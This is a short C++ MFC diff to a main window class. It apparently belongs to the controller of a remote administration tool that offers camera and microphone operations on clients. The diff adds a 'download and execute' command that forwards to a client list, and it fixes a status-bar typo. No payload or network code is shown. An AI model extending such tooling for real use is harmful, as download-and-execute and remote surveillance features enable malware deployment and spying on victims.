@@ -54,6 +54,7 @@ BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
 	ON_COMMAND(ID_OPERATION_CAMERA, &CMainFrame::OnOperationCamera)
 	ON_COMMAND(ID_SESSION_RESTART, &CMainFrame::OnSessionRestart)
 	ON_COMMAND(ID_OPERATION_MICROPHONE, &CMainFrame::OnOperationMicrophone)
+	ON_COMMAND(ID_OPERATION_DOWNLOADANDEXEC, &CMainFrame::OnOperationDownloadandexec)
 END_MESSAGE_MAP()
 
 static UINT indicators[] =
@@ -279,7 +280,7 @@ void CMainFrame::OnUpdateStatuBar()
 	m_wndStatusBar.SetPaneText(2, PaneText);
 	//ServerStatu
 
-	PaneText.Format(L"SvrStatu: %s", wszSvrStatu[m_ServerStatu]);
+	PaneText.Format(L"SrvStatu: %s", wszSvrStatu[m_ServerStatu]);
 	m_wndStatusBar.SetPaneText(0, PaneText);
 }
 void CMainFrame::OnTimer(UINT_PTR nIDEvent)
@@ -526,4 +527,10 @@ void CMainFrame::OnSessionRestart()
 void CMainFrame::OnOperationMicrophone()
 {
 	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_MICROPHONE, 0);
+}
+
+
+void CMainFrame::OnOperationDownloadandexec()
+{
+	::SendMessage(m_ClientList.GetSafeHwnd(), WM_COMMAND, ID_OPERATION_DOWNLOADANDEXEC, 0);
 }
